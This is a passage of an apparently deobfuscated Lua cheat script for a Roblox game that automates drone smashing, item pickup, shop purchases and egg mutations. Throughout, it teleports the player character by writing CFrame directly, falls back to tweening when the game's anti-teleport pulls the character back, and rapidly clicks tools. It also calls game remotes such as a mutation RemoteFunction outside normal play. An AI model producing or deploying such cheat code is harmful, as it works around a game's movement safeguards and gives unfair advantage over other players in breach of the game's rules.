							tbl15.List[#tbl15.List + 1] = child
						end
					end
				end
			end
		end

		tbl15.Beat = RunService.Heartbeat:Connect(function()
			local now = os.clock()
			if tbl15.SpamUntil <= now then
				return
			end

			if tbl15.Dirty or now - tbl15.BuiltAt > 1 then
				tbl15.Rebuild()
			end

			local character = localPlayer.Character
			local flag4 = now >= tbl15.NextBag

			if flag4 then
				tbl15.NextBag = now + 0.25
			end

			for _, v13 in ipairs(tbl15.List) do
				local parent = v13.Parent

				if parent == character then
					tbl15.Click(v13)
				elseif flag4 and parent ~= nil then
					tbl15.Click(v13)
				end
			end
		end)

		tbl15.Unwatch = function()
			for i = #tbl15.Links, 1, -1 do
				pcall(function()
					tbl15.Links[i]:Disconnect()
				end)

				tbl15.Links[i] = nil
			end
		end

		tbl15.Watch = function(arg)
			tbl15.Unwatch()
			tbl15.Dirty = true
			if not arg then
				return
			end

			tbl15.Links[#tbl15.Links + 1] = arg.ChildAdded:Connect(function(child)
				if not child:IsA("Tool") then
					return
				end
				tbl15.Dirty = true
				local spamUntil = tbl15.SpamUntil

				if os.clock() < spamUntil and tbl14.Valid(child) then
					tbl15.Click(child)
					task.defer(tbl15.Click, child)
				end
			end)

			tbl15.Links[#tbl15.Links + 1] = arg.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					tbl15.Dirty = true
				end
			end)

			task.defer(function()
				local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)

				if backpack and localPlayer.Character == arg then
					tbl15.Links[#tbl15.Links + 1] = backpack.ChildAdded:Connect(function()
						tbl15.Dirty = true
					end)

					tbl15.Links[#tbl15.Links + 1] = backpack.ChildRemoved:Connect(function()
						tbl15.Dirty = true
					end)
				end
			end)
		end

		tbl15.Watch(localPlayer.Character)
		tbl15.CharLink = localPlayer.CharacterAdded:Connect(tbl15.Watch)

		fn4(function()
			tbl15.SpamUntil = 0
			tbl15.Unwatch()

			for _, v13 in ipairs({ "Beat", "CharLink" }) do
				if tbl15[v13] then
					pcall(function()
						tbl15[v13]:Disconnect()
					end)

					tbl15[v13] = nil
				end
			end
		end)

		local function fn57()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return false
			end
			local v13, v14 = fn55()
			if not v13 or not v14 then
				return fn54()
			end
			local tbl22 = { v13, v14 }
			local tbl23 = { 0.3, 0.4 }
			local v15 = tbl22[tbl15.Index]

			if tbl15.Tool ~= v15 then
				local v16 = tbl15
				local v17 = tbl15
				local now = os.clock()
				v16.Tool = v15
				v17.Since = now
			end

			local flag4 = v15.Parent == character

			if flag4 then
				local since = tbl15.Since
				flag4 = os.clock() - since >= tbl23[tbl15.Index]
			end

			if flag4 then
				tbl15.Index = tbl15.Index == 1 and 2 or 1
				v15 = tbl22[tbl15.Index]
				local v16 = tbl15
				local v17 = tbl15
				local now = os.clock()
				v16.Tool = v15
				v17.Since = now
			end

			tbl14.Tool = v15
			str2 = tbl14.Name(v15)

			if v15.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(v15)
				end)

				if v15.Parent ~= character then
					pcall(function()
						v15.Parent = character
					end)
				end

				tbl15.Since = os.clock()

				if v15.Parent == character then
					fn56(v15)
					task.defer(fn56, v15)
				end

				return true
			end

			fn56(v15)
			return true
		end

		local function fn58(arg, arg2, arg3)
			local now = os.clock()
			local n19 = now + n12

			while os.clock() < n19 and not arg() do
				local v13, v14 = fn47()
				local flag4 = not v14
				local flag5

				if flag4 then
					flag5 = flag4
				elseif arg2 then
					flag5 = (v14.Position - arg2).Magnitude > (arg3 or 40)
				else
					flag5 = arg2
				end

				if flag5 then
					if arg2 and os.clock() - now < 1.2 then
						task.wait(0.1)
						continue
					end
					return
				end

				if fn22() and not fn22(v14.Position) then
					fn32()
					str = "Leaving the base through the safe zone"
					if not fn24(v14.Position + Vector3.new(0, 2.5, 0), arg, 6) then
						return
					end
					continue
				end

				str = v14.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
				fn48(v14.Position + Vector3.new(0, 2.5, 0), v14.Position)
				local n20 = os.clock() + 2.5

				while tbl13[v13] and os.clock() < n20 and not arg() do
					task.wait(0.1)
				end

				tbl13[v13] = nil
				n19 = os.clock() + 1.2
			end
		end

		local function fn59(arg, arg2)
			local now = os.clock()
			local n19 = tonumber(arg.Health) or 0
			local now2 = nil
			local fn60 = nil
			local flag4 = false
			local now3

			while not arg2() do
				local v13 = tbl12[arg.Id]
				local flag5 = not v13

				if not flag5 then
					flag5 = (tonumber(v13.Health) or 0) <= 0
				end

				if flag5 then
					return true
				end
				local v14 = fn40(arg.Id)
				if v14 and v14:GetAttribute("DroneState") == "Death" then
					tbl12[arg.Id] = nil
					return true
				end
				local v15 = fn16()
				local flag6 = v15 ~= nil and v13.Position ~= nil

				if flag6 then
					flag6 = (v15.Position - (fn44(v13) or v13.Position)).Magnitude <= 30
				end

				if flag6 and not v14 then
					now2 = now2 or os.clock()
					if os.clock() - now2 > 1.5 then
						tbl12[arg.Id] = nil
						return false
					end
				else
					now2 = nil
				end

				local n20 = tonumber(v13.Health) or 0

				if n20 ~= n19 then
					now3 = nil
					n19 = n20
				end

				if n11 < os.clock() - now then
					tbl18[arg.Id] = os.clock() + 30
					return false
				end
				local position = fn44(v13) or v13.Position
				local v16 = fn16()
				if not v16 then
					return false
				end

				if fn22() and not fn22(position) then
					fn32()
					str = "Leaving the base through the safe zone"
					if not fn24(position, arg2, 12) then
						return false
					end

					if arg2() then
						return false
					end
				end

				if not fn60 then
					local v17 = nil
					local isBasePart = nil

					fn60 = function()
						local v18 = tbl12[arg.Id]
						if not v18 then
							return nil
						end

						if not v17 or not v17.Parent then
							v17 = fn40(arg.Id)
							local hitbox = v17 and v17:FindFirstChild("Hitbox")
							isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or v17 and v17.PrimaryPart or nil
						end

						if isBasePart and isBasePart.Parent then
							return isBasePart.Position
						end
						return v18.Position
					end
				end

				if flag2 then
					fn48(position + Vector3.new(0, -1, 16), position, fn60)
				else
					fn48(position + Vector3.new(0, -1, 5), position)
				end

				if (v16.Position - position).Magnitude <= 60 and not flag2 then
					fn53()
				end

				local magnitude = (v16.Position - position).Magnitude
				local flag7 = false

				if flag2 then
					flag7 = math.max(12, n8 + 7)
				end

				local flag8 = magnitude <= (flag7 or 12)

				if flag8 then
					if flag2 then
						tbl15.SpamUntil = os.clock() + 0.2
					end

					now3 = now3 or os.clock()
					if os.clock() - now3 > 8 then
						tbl18[arg.Id] = os.clock() + 30
						return false
					end
					local flag9 = false

					if flag2 then
						flag9 = fn57()
					end

					if flag9 or not flag2 and fn54() then
						str = string.format("Smashing %s  %d HP", v13.Tier ~= "" and v13.Tier or "drone", math.max(0, tonumber(v13.Health) or 0))
					elseif not flag4 then
						str = "No bat found, get any bat to smash drones"
						flag4 = true
					end
				else
					str = "Flying to a drone"
				end

				local wait = task.wait
				local flag9 = false

				if flag2 then
					flag9 = flag8
				end

				wait(flag9 and 0.03 or 0.1)
			end

			return false
		end

		local function fn60(arg)
			for _, v13 in ipairs(tbl17) do
				if arg() then
					return false
				end
				str = "Looking for drones"
				fn48(v13)
				local n19 = os.clock() + 12

				while os.clock() < n19 and not arg() do
					fn43()
					if #fn45() > 0 then
						return true
					end

					if tbl4.DistanceTo(v13) < 8 then
						break
					end
					task.wait(0.2)
				end
			end

			return #fn45() > 0
		end

		local function fn61()
			local serverTimeNow = workspace:GetServerTimeNow()
			local v13, v14 = fn12()
			if v13 and v14 and v14 < 25 then
				return next(tbl13) ~= nil
			end

			for _, v15 in pairs(tbl13) do
				if v15.Kind == "Part" or v15.ExpiresAt and v15.ExpiresAt - serverTimeNow < 30 then
					return true
				end
			end

			return false
		end

		local v13 = nil

		local function fn62()
			local window = type(snapshot) == "table" and snapshot.Window or nil
			return type(window) == "table" and window.Index or nil
		end

		local function fn63(arg)
			local flag4 = v13 ~= nil and v13 == fn62()

			while not arg() do
				RunService.Heartbeat:Wait()

				if not arg() then
					fn43()

					if fn61() then
						fn58(arg)
					end

					local v14, flag5, flag6, flag7, v15, position, flag8, magnitude, flag9, flag10, flag11, vector, flag12, n19, v16, n20, flag13, flag14

					if fn22() then
						fn32()

						if fn23(arg) then
							v14 = fn46()
							flag5 = not v14 and next(tbl13) ~= nil

							if flag5 then
								fn58(arg)
								fn43()
								v14 = fn46()
							end

							if not v14 then
								flag6 = not fn12() or flag4

								if not flag6 then
									v13 = fn62()
									flag7 = true
									flag4 = true

									if not fn60(arg) then
										break
									else
										continue
									end
								end
							else
								v15 = fn44(v14)
								position = v15 or v14.Position
								flag8 = fn16()
								magnitude = flag8 and (flag8.Position - position).Magnitude or 0
								flag9 = v9 == "Teleport"
								flag8 = flag9 and flag8

								if flag8 then
									flag10 = fn22() and not fn22(position)
									flag8 = not flag10
								end

								if flag8 then
									flag11 = magnitude > n10 and magnitude <= n13 and os.clock() >= n16 and os.clock() - n17 >= n14

									if flag11 then
										n17 = os.clock()
										vector = Vector3.new
										flag12 = false

										if flag2 then
											flag12 = 16
										end

										flag12 = flag12 or 5
										n19 = position + vector(0, -1, flag12)
										fn48(n19, position)
										v16 = fn16()

										if v16 then
											str = "Teleporting to the next drone"

											pcall(function()
												v16.CFrame = CFrame.lookAt(n19, Vector3.new(position.X, n19.Y, position.Z))
												v16.AssemblyLinearVelocity = Vector3.zero
												v16.AssemblyAngularVelocity = Vector3.zero
											end)

											n20 = os.clock() + 0.8

											while true do
												flag13 = os.clock() < n20 and not arg()

												if flag13 then
													flag14 = fn16()
													flag14 = flag14 and (flag14.Position - n19).Magnitude > 40

													if flag14 then
														n16 = os.clock() + 30
														str = "Teleport pulled back, tweening"
														break
													else
														RunService.Heartbeat:Wait()
														continue
													end
												end

												break
											end
										end
									end
								end

								fn59(v14, arg)
								continue
							end
						end
					else
						v14 = fn46()
						flag5 = not v14 and next(tbl13) ~= nil

						if flag5 then
							fn58(arg)
							fn43()
							v14 = fn46()
						end

						if not v14 then
							flag6 = not fn12() or flag4

							if not flag6 then
								v13 = fn62()
								flag7 = true
								flag4 = true

								if not fn60(arg) then
									break
								else
									continue
								end
							end
						else
							v15 = fn44(v14)
							position = v15 or v14.Position
							flag8 = fn16()
							magnitude = flag8 and (flag8.Position - position).Magnitude or 0
							flag9 = v9 == "Teleport"
							flag8 = flag9 and flag8

							if flag8 then
								flag10 = fn22() and not fn22(position)
								flag8 = not flag10
							end

							if flag8 then
								flag11 = magnitude > n10 and magnitude <= n13 and os.clock() >= n16 and os.clock() - n17 >= n14

								if flag11 then
									n17 = os.clock()
									vector = Vector3.new
									flag12 = false

									if flag2 then
										flag12 = 16
									end

									flag12 = flag12 or 5
									n19 = position + vector(0, -1, flag12)
									fn48(n19, position)
									v16 = fn16()

									if v16 then
										str = "Teleporting to the next drone"

										pcall(function()
											v16.CFrame = CFrame.lookAt(n19, Vector3.new(position.X, n19.Y, position.Z))
											v16.AssemblyLinearVelocity = Vector3.zero
											v16.AssemblyAngularVelocity = Vector3.zero
										end)

										n20 = os.clock() + 0.8

										while true do
											flag13 = os.clock() < n20 and not arg()

											if flag13 then
												flag14 = fn16()
												flag14 = flag14 and (flag14.Position - n19).Magnitude > 40

												if flag14 then
													n16 = os.clock() + 30
													str = "Teleport pulled back, tweening"
													break
												else
													RunService.Heartbeat:Wait()
													continue
												end
											end

											break
										end
									end
								end
							end

							fn59(v14, arg)
							continue
						end
					end
				end

				break
			end

			fn58(arg)
			fn32()
		end

		local tbl22 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

		tbl4.ScrambleLostPart = function(arg)
			return fn13(fn10(), arg)
		end

		v10 = nil

		fn33 = function()
			local v14 = fn10()
			if not v14 then
				return "Lost Parts: no event data"
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			local tbl23 = {}
			local n19 = 0
			local n20 = 0

			for _, v15 in ipairs(tbl10) do
				local v16 = drScrambleEvent and drScrambleEvent:FindFirstChild(v15)

				if v16 then
					n19 += 1
				end

				if fn13(v14, v15) then
					n20 += 1
				elseif v16 then
					local ok, result = pcall(v16.GetPivot, v16)
					ok = ok and tbl4.DistanceTo(result.Position) or nil
					tbl23[#tbl23 + 1] = ok and string.format("%s %d studs", tbl22[v15], math.floor(ok)) or tbl22[v15]
				else
					tbl23[#tbl23 + 1] = tbl22[v15] .. " not on map"
				end
			end

			local str3 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n19, n20)

			if #tbl23 > 0 then
				str3 ..= "  -  " .. table.concat(tbl23, "  -  ")
			end

			return str3
		end

		local function fn64(arg)
			if not fn21() then
				return true
			end
			local Exit = fn19("Exit")
			local v14 = fn20(Exit, nil)
			if not v14 then
				return false
			end
			str = "Leaving the Secret Cave"
			if not fn17(v14, arg, 4) then
				return false
			end

			for i = 1, 4 do
				if arg() then
					return false
				end
				fn18(Exit or fn19("Exit"))
				local n19 = os.clock() + 1.5

				while os.clock() < n19 and fn21() do
					RunService.Heartbeat:Wait()
				end

				if not fn21() then
					return true
				end
			end

			return not fn21()
		end

		local function fn65()
			return tbl4.IsNight() or tbl4.WallSealed()
		end

		local function fn66(arg)
			if not fn65() then
				return true
			end
			fn32()

			while fn65() and not arg() do
				str = tbl4.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
				RunService.Heartbeat:Wait()
			end

			return not arg()
		end

		fn34 = function()
			if not tbl4.Toggle(nil, false) or not fn11() then
				return false
			end

			if tbl16.Ended then
				return false
			end

			if fn12() then
				return true
			end
			fn43()
			return #fn45() > 0 or next(tbl13) ~= nil
		end

		fn35 = function()
			local v14 = fn10()
			if not v14 or v14.Completed == true or not fn11() then
				return false
			end
			local num = tonumber(v14.TotalParts)

			if not num then
				num = fn14(v14) + (tonumber(v14.DroneParts) or 0)
			end

			local flag4 = tbl4.Toggle(nil, false)

			if flag4 then
				local n19 = #tbl10
				flag4 = fn14(v14) < n19
			end

			local flag5 = tbl4.Toggle(nil, false) and (num >= 5 or v14.Discovered ~= true)
			return flag4 or flag5
		end

		fn36 = function(arg)
			local function fn67()
				return arg ~= n6 or tbl4.Movement.Owner ~= "scramble"
			end

			local function fn68()
				return fn67() or not fn34() or fn65()
			end

			while true do
				if fn34() and not fn67() then
					if fn66(fn67) then
						pcall(fn63, fn68)
						if fn65() then
							continue
						end
					end
				end

				break
			end

			fn32()
			if fn67() or fn34() then
				return
			end

			if not fn35() then
				fn25(fn67)
				str = ""
				return
			end

			if not fn66(fn67) then
				return
			end
			fn9(true)
			local v14 = fn10()
			if not v14 then
				return
			end

			if not fn35() then
				str = ""
				return
			end

			if tbl4.Toggle(nil, false) and v14.Discovered ~= true then
				pcall(fn26, fn67)
			end

			if tbl4.Toggle(nil, false) then
				pcall(fn27, function()
					return fn67() or not tbl4.Toggle(nil, false) or fn34() or fn65()
				end)
			end

			if tbl4.Toggle(nil, false) then
				pcall(fn28, function()
					return fn67() or not tbl4.Toggle(nil, false) or fn34() or fn65()
				end)
			end

			if fn21() and not fn67() then
				pcall(fn64, fn67)
			end

			if not fn21() and not fn34() then
				pcall(fn25, fn67)
			end
		end
	end

	local fn37

	fn37 = function(arg)
		if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
			return true
		end

		for i = 1, 3 do
			if arg() then
				return false
			end
			str = "Jumping off the treadmill"
			tbl4.Treadmill.Riding = false
			task.spawn(tbl4.LeaveBelt)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Sit = false
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			local v11 = fn16()

			if v11 then
				local position = v11.Position
				local n15 = position + Vector3.new(0, 18, 0)
				local now = os.clock()

				while true do
					RunService.Heartbeat:Wait()
					local v12 = fn16()

					if not v12 then
						break
					else
						local n16 = math.min(1, (os.clock() - now) / 0.25)

						pcall(function()
							local rotation = v12.CFrame.Rotation
							v12.CFrame = CFrame.new(position:Lerp(n15, n16)) * rotation
							v12.AssemblyLinearVelocity = Vector3.zero
							v12.AssemblyAngularVelocity = Vector3.zero
						end)

						if not (n16 >= 1) then
							continue
						end
						break
					end
				end
			end

			if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
				return true
			end
		end

		return not tbl4.OnBelt()
	end

	do
		local tbl19 = { "Highest Value", "Best Rarity", "Biggest Size" }
		local tbl20 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
		local n15 = 6

		local tbl21 = {
			Handle = nil,
			BuyHandle = nil,
			Loop = 0,
			MinRarity = 0,
			MinIncome = 0,
			Priority = tbl19[1],
			SkipMutated = true,
			Targets = {},
			Cooldown = 0,
			Status = "Idle",
			State = "idle",
			Detail = "Turn it on to start applying Scrambled",
			RarityColor = "#FFFFFF",
			Icon = "",
			Ui = {},
			Row = nil,
			Left = 0,
			Pen = 0,
			Match = 0,
			Tries = 0,
			Hits = 0,
			Locked = nil,
			Short = false,
			EggOptions = {},
			EggCategory = {},
		}

		local directory = tbl.Assets and tbl.Assets.Directory
		local tbl22 = {}

		if type(directory) == "table" then
			for k, v11 in pairs(directory) do
				local rarity = type(v11) == "table" and v11.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				local v12 = flag4 or nil

				if v12 then
					table.insert(tbl22, {
						Category = tostring(k),
						Name = tostring(v11.DisplayName or k),
						Rarity = v12,
						RarityName = tostring(rarity.DisplayName or rarity._id or v12),
					})
				end
			end
		end

		table.sort(tbl22, function(arg, arg2)
			if arg.Rarity ~= arg2.Rarity then
				return arg.Rarity > arg2.Rarity
			end
			return arg.Name < arg2.Name
		end)

		for _, v11 in ipairs(tbl22) do
			local str3 = string.format("%s [%s]", v11.Name, v11.RarityName)

			if tbl21.EggCategory[str3] then
				str3 = string.format("%s [%s] (%s)", v11.Name, v11.RarityName, v11.Category)
			end

			table.insert(tbl21.EggOptions, str3)
			tbl21.EggCategory[str3] = v11.Category
		end

		local function fn38(arg)
			local directory2 = tbl.Assets and tbl.Assets.Directory
			return type(directory2) == "table" and directory2[tostring(arg)] or nil
		end

		local function fn39(arg)
			local v11 = fn38(arg.AssetCategory)
			local rarity = type(v11) == "table" and v11.Rarity or nil
			local flag4 = type(rarity) == "table"

			if flag4 then
				flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return flag4 or 0
		end

		local function fn40(arg)
			local v11 = fn38(arg.AssetCategory)
			local n16 = type(v11) == "table" and tonumber(v11.EarningRate) or 0
			local n17 = tonumber(arg.AssetScale) or 0
			if n16 <= 0 or n17 <= 0 then
				return 0
			end
			return n16 * (n17 > 5 and (n17 / 5) ^ 1.2 * 19.637875755794113 or n17 ^ 1.85)
		end

		local function fn41(arg)
			if tostring(arg.BaseMutation or "") == "Scrambled" then
				return true
			end

			if type(arg.Mutations) == "table" then
				for k, mutation in pairs(arg.Mutations) do
					if type(mutation) == "string" and mutation == "Scrambled" then
						return true
					end

					if type(k) == "string" and k == "Scrambled" and mutation ~= false then
						return true
					end
				end
			end

			return false
		end

		local function fn42()
			local eggState = tbl.EggState
			if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
				return {}
			end
			local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			if not ok or type(result) ~= "table" then
				return {}
			end
			local tbl23 = {}

			for k, v11 in pairs(result) do
				if type(v11) == "table" and v11.Placement ~= nil then
					k = v11.Uid or k
					v11.Uid = k
					tbl23[#tbl23 + 1] = v11
				end
			end

			return tbl23
		end

		local function fn43(arg)
			arg = arg and arg.Uid

			if arg then
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local v11 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)

				if v11 then
					local ok, result = pcall(function()
						return v11:GetPivot().Position
					end)

					if ok and typeof(result) == "Vector3" then
						return result
					end
				end
			end

			if type(tbl4.PenAnchor) == "function" then
				local ok, result = pcall(tbl4.PenAnchor)
				if ok and typeof(result) == "Vector3" then
					return result
				end
			end

			return nil
		end

		local function fn44(arg, arg2)
			local v11 = fn43(arg)
			if v11 == nil then
				return true
			end

			if tbl4.DistanceTo(v11) <= n15 then
				return true
			end

			local function fn45()
				if arg2 ~= tbl21.Loop or not tbl4.Toggle(tbl21.Handle, false) then
					return true
				end

				if tbl4.Movement.PlaceWanted == true then
					return true
				end
				return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
			end

			if tbl4.Treadmill.Riding or tbl4.OnBelt() then
				tbl4.ExitBelt()
			end

			tbl4.HoldBelt()
			local ok, result = pcall(tbl4.FlyTo, v11 + Vector3.new(0, 3, 0), fn45, "mutation")
			tbl4.ReleaseBelt()
			tbl4.LeaveBelt()
			local flag4 = ok and result

			if flag4 then
				local n16 = n15 + 4
				flag4 = tbl4.DistanceTo(v11) <= n16
			end

			return flag4
		end

		local v11 = fn29

		local function fn45(arg)
			if not arg then
				return 0
			end
			local num = tonumber(arg:GetAttribute("Uses"))
			if num ~= nil then
				return num
			end
			local v12 = string.match(arg.Name, "%[X(%d+)%]")
			return tonumber(v12) or 1
		end

		local function fn46()
			local v12 = v11()
			if not v12 then
				return nil, 0
			end
			local v13 = fn45(v12)
			if v13 <= 0 then
				return nil, 0
			end
			return v12, v13
		end

		tbl21.Grip = function(arg)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not character or not humanoid or not arg or arg.Parent == nil then
				return false
			end

			if arg.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				if arg.Parent ~= character then
					pcall(function()
						arg.Parent = character
					end)
				end

				task.wait(0.2)
			end

			return arg.Parent == character
		end

		local function fn47()
			if not tbl4.Toggle(tbl21.BuyHandle, false) or flag3 then
				return false
			end
			flag3 = true
			local flag4 = false

			local ok, result = pcall(function()
				flag4 = tbl21.Purchase()
			end)

			flag3 = false

			if not ok then
				tbl21.Status = "Buy failed: " .. tostring(result)
			end

			return flag4
		end

		tbl21.Purchase = function()
			local n16 = 0
			local short = false

			for i = 1, 10 do
				local flag4 = n16 == 0 and fn9(true) or snapshot
				local v12 = fn10()

				if not (type(flag4) ~= "table" or type(v12) ~= "table") then
					local v13, v14, v15 = ipairs(type(flag4.Shop) == "table" and flag4.Shop or {})
					local v16 = nil

					for _, v17 in v13, v14, v15 do
						if type(v17) == "table" and v17.Id == "MutationConsumable" then
							v16 = v17
						end
					end

					if v16 then
						local num = tonumber(v16.PurchaseLimit)

						if not (num and fn30(v12, v16) >= num) then
							local huge = tonumber(v16.Price) or math.huge

							if (tonumber(v12.Samples) or 0) - huge < n4 then
								short = true

								if n16 == 0 then
									tbl21.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
								end

								break
							else
								local Shop = fn8("Shop", v16.Id, { Quote = v16.Quote, Sequence = tonumber(v12.ShopSequence) or 0 })

								if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
									n16 += 1
									task.wait(0.4)
									continue
								end
							end
						end
					end
				end

				break
			end

			if n16 > 0 then
				tbl21.Status = string.format("Bought %d Scrambled", n16)
				tbl21.Short = short
				return true
			end

			tbl21.Short = short
			return false
		end

		local function fn48()
			local pen = 0
			local match = 0
			local n16 = -1
			local v12 = nil

			for _, v13 in ipairs(fn42()) do
				pen += 1
				local skipMutated = tbl21.SkipMutated and fn41(v13)
				local flag4 = false

				if skipMutated then
					flag4 = true
				end

				local flag5 = not flag4

				if flag5 then
					local minRarity = tbl21.MinRarity
					flag5 = fn39(v13) < minRarity
				end

				if flag5 then
					flag4 = true
				end

				local flag6 = not flag4 and tbl21.MinIncome > 0

				if flag6 then
					local minIncome = tbl21.MinIncome
					flag6 = fn40(v13) < minIncome
				end

				if flag6 then
					flag4 = true
				end

				if not flag4 and next(tbl21.Targets) ~= nil and tbl21.Targets[tostring(v13.AssetCategory)] ~= true then
					flag4 = true
				end

				if not flag4 then
					match += 1
					local n17

					if tbl21.Priority == tbl19[2] then
						n17 = fn39(v13) * 1000 + (tonumber(v13.AssetScale) or 0)
					elseif tbl21.Priority == tbl19[3] then
						n17 = tonumber(v13.AssetScale) or 0
					else
						n17 = fn40(v13)
					end

					local flag7 = n17 > n16

					if not flag7 and v12 ~= nil and n17 == n16 and v13.Uid == tbl21.Locked then
						n16 = n17
						v12 = v13
					elseif flag7 then
						n16 = n17
						v12 = v13
					end
				end
			end

			local v13 = tbl21
			tbl21.Pen = pen
			v13.Match = match
			return v12
		end

		local function fn49(arg)
			if typeof(arg) ~= "Color3" then
				return "#FFFFFF"
			end
			local floor = math.floor
			local n16 = arg.B * 255 + 0.5
			return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n16))
		end

		local function fn50(arg)
			local ok, result = pcall(Color3.fromHex, arg)
			if not ok or typeof(result) ~= "Color3" then
				return arg
			end
			local v12, v13, v14 = result:ToHSV()
			return fn49(Color3.fromHSV(v12, math.min(v13, 0.78), math.max(v14, 0.82)))
		end

		local function fn51(arg)
			local v12 = fn38(arg and arg.AssetCategory)
			local icon = type(v12) == "table" and v12.Icon or nil
			if icon == nil then
				return ""
			end

			if tonumber(icon) then
				return "rbxassetid://" .. tostring(icon)
			end
			return tostring(icon)
		end

		local function fn52(arg)
			local v12 = fn38(arg and arg.AssetCategory)
			local rarity = type(v12) == "table" and v12.Rarity or nil
			local flag4 = type(rarity) == "table"

			if flag4 then
				flag4 = tostring(rarity.DisplayName or rarity._id or "")
			end

			return flag4 or "", fn50(fn49(type(rarity) == "table" and rarity.Color or nil))
		end

		local function fn53(arg)
			if type(arg) ~= "table" then
				return "No egg selected"
			end
			local v12 = fn38(arg.AssetCategory)
			local flag4 = type(v12) == "table"

			if flag4 then
				flag4 = tostring(v12.DisplayName or arg.AssetCategory)
			end

			return flag4 or tostring(arg.AssetCategory)
		end

		local function fn54()
			local idle = tbl20[tbl21.State] or tbl20.idle

			if tbl21.Ui.Accent and type(tbl21.Ui.Accent.Set) == "function" then
				tbl21.Ui.Accent.Set({ Background = idle })
			end

			if tbl21.Ui.Title and type(tbl21.Ui.Title.Set) == "function" then
				tbl21.Ui.Title.Set({ Text = tbl21.Status, Color = idle })
			end

			if tbl21.Ui.Egg and type(tbl21.Ui.Egg.Set) == "function" then
				tbl21.Ui.Egg.Set({ Text = tbl21.Detail, Color = tbl21.RarityColor })
			end

			if tbl21.Ui.Meta and type(tbl21.Ui.Meta.Set) == "function" then
				tbl21.Ui.Meta.Set({
					Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl21.Left, tbl21.Match, tbl21.Pen, tbl21.Tries, tbl21.Hits),
				})
			end

			if tbl21.Ui.Icon and type(tbl21.Ui.Icon.Set) == "function" then
				tbl21.Ui.Icon.Set({ Visible = tbl21.Icon ~= "", Image = tbl21.Icon, StrokeColor = tbl21.RarityColor })
			end

			if tbl21.Row and type(tbl21.Row.Set) == "function" then
				pcall(tbl21.Row.Set, tbl21.Row, tbl21.Status .. "  -  " .. tbl21.Detail)
			end
		end

		local function fn55(arg)
			if type(arg) ~= "table" then
				tbl21.Detail = "No egg matches the filters"
				tbl21.RarityColor = "#C7CBD6"
				tbl21.Icon = ""
				return
			end

			local v12, v13 = fn52(arg)
			local n16 = tonumber(arg.AssetScale) or 0
			tbl21.Detail = string.format("%s   %.2f kg", fn53(arg), n16)

			if v12 ~= "" then
				tbl21.Detail = tbl21.Detail .. "   " .. string.upper(v12)
			end

			tbl21.RarityColor = v13
			tbl21.Icon = fn51(arg)
		end

		tbl21.Apply = function(arg, arg2)
			if not tbl21.Grip(arg2) then
				tbl21.State = "work"
				tbl21.Status = "Could not hold Scrambled"
				tbl21.Cooldown = os.clock() + 2
				return false
			end

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

			if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
				tbl21.State = "stop"
				tbl21.Status = "Mutation remote is missing"
				tbl21.Cooldown = os.clock() + 10
				return false
			end

			tbl21.State = "work"
			tbl21.Status = "Applying Scrambled"
			tbl21.Tries = tbl21.Tries + 1

			local ok, result = pcall(function()
				return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
			end)

			if not ok or type(result) ~= "table" then
				tbl21.Cooldown = os.clock() + 10
				return false
			end

			if result.Success == true then
				tbl21.Status = "Scrambled applied"
				tbl21.Locked = nil
				tbl21.State = "good"
				tbl21.Hits = tbl21.Hits + 1
				return true
			end

			local str3 = tostring(result.Message or "")
			local v12 = string.lower(str3)
			tbl21.Status = str3 ~= "" and str3 or "Try failed"
			tbl21.State = "work"

			if string.find(v12, "not found") or string.find(v12, "invalid") then
				tbl21.Locked = nil
				tbl21.Cooldown = os.clock() + 3
				return false
			end

			return true
		end

		tbl21.Settle = function()
			local n16 = os.clock() + 3

			while os.clock() < n16 do
				if tbl4.Grounded() then
					return
				end
				RunService.Heartbeat:Wait()
			end
		end

		tbl21.Over = function(arg)
			if arg ~= tbl21.Loop or not tbl4.Toggle(tbl21.Handle, false) then
				return true
			end

			if tbl4.Movement.PlaceWanted == true then
				return true
			end
			return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
		end

		tbl21.Idle = function(status, detail, arg)
			tbl21.State = "idle"
			tbl21.Status = status
			tbl21.Left = 0
			tbl21.Detail = detail
